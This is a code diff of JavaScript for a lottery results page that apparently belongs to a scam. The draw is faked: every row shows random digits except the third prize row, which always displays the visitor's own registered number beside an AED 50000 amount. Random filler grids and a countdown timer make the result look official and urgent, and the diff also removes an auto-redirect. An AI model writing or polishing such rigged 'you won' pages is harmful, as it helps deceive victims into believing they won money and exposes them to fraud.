@@ -1,22 +1,31 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Date Fix: "Loading" ki jagah current date dikhao
-    const dateEl = document.getElementById('date');
-    if(dateEl) dateEl.innerText = new Date().toLocaleDateString('en-GB');
-
-    // 2. Prize Container Build
+    // 1. Prize Container Setup
     const container = document.getElementById('prize-container');
-    const prizeNames = ["1ST PRIZE RESULT", "2ND PRIZE RESULT", "3RD PRIZE - YOUR NUMBER", "4TH PRIZE", "5TH PRIZE", "6TH PRIZE"];
+    
+    // Prize Names aur unke corresponding Amounts ki list
+    const prizes = [
+        { name: "1ST PRIZE RESULT", amount: "AED 400000" },
+        { name: "2ND PRIZE RESULT", amount: "AED 200000" },
+        { name: "3RD PRIZE - YOUR NUMBER", amount: "AED 50000" },
+        { name: "4TH PRIZE", amount: "AED 40000" },
+        { name: "5TH PRIZE", amount: "AED 20000" },
+        { name: "6TH PRIZE", amount: "AED 5000" }
+    ];
     
     if(container) {
-        container.innerHTML = ''; // Fresh start
-        prizeNames.forEach((name, idx) => {
+        container.innerHTML = ''; 
+        prizes.forEach((prize, idx) => {
             const isWinner = (idx === 2); 
             const section = document.createElement('div');
             section.id = isWinner ? 'winner_section' : '';
             section.className = isWinner ? 'winner-section' : 'prize-group';
             
+            // Banner ke andar flex aur justify-between dala hai
             section.innerHTML = `
-                <div class="prize-banner ${isWinner ? '!bg-green-600 !text-white' : ''}">${name}</div>
+                <div class="prize-banner flex justify-between items-center px-4 ${isWinner ? '!bg-green-600 !text-black' : ''}">
+                    <span>${prize.name}</span>
+                    <span class="font-black italic">${prize.amount}</span>
+                </div>
                 <div class="flex justify-center gap-2" id="group-${idx}">
                     ${Array(6).fill(0).map(() => `
                         <div class="ball rolling">
@@ -30,21 +39,21 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // 3. Footer Sections Fix (Starter & Consolation)
+    // 2. Footer Grids
     const fillGrid = (id) => {
         const el = document.getElementById(id);
         if(el) {
-            el.innerHTML = ''; // Clear loading text
+            el.innerHTML = ''; 
             for(let i=0; i<20; i++) {
-                el.innerHTML += `<div class="grid-num">${Math.floor(1000 + Math.random() * 9000)}</div>`;
+                el.innerHTML += `<div class="grid-num" style="background:rgb(255, 255, 255); color:black; padding:5px; border-radius:5px; text-align:center; font-weight:bold; font-size:10px; border:1px solid #ddd;">${Math.floor(1000 + Math.random() * 9000)}</div>`;
             }
         }
     }
     fillGrid('starter-grid');
     fillGrid('consolation-grid');
 
-    // 4. Timer Logic
-    let h=23, m=34, s=57; //
+    // 3. Timer Logic
+    let h=23, m=34, s=57;
     setInterval(() => {
         const timerEl = document.getElementById('timer');
         if(timerEl) {
@@ -53,13 +62,13 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }, 1000);
 
-    // 5. Animation Stop & Number Match
+    // 4. Animation Stop Logic
     setTimeout(() => {
         const regDigits = (typeof global_user_lottery !== 'undefined' && global_user_lottery !== "") 
             ? global_user_lottery.toString().padStart(6, '0').split('') 
             : ['0','0','0','0','0','0'];
 
-        prizeNames.forEach((_, idx) => {
+        prizes.forEach((_, idx) => {
             const isWin = (idx === 2);
             const group = document.getElementById(`group-${idx}`);
             if(!group) return;
@@ -72,7 +81,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     ball.classList.remove('rolling');
                     strips[i].classList.remove('spinning');
                     
-                    // Match Logic for 3rd Row
                     let finalDigit = isWin ? regDigits[i] : Math.floor(Math.random()*10);
                     strips[i].innerHTML = `<div class="text-xl font-black text-white">${finalDigit}</div>`;
                     
@@ -88,10 +96,5 @@ document.addEventListener('DOMContentLoaded', () => {
                 }, i * 180);
             });
         });
-    }, 4000);
-
-    // 60 seconds baad auto logout/redirect
-setTimeout(() => {
-    window.location.href = 'luckyday.php';
-}, 60000);
+    }, 8000);
 });
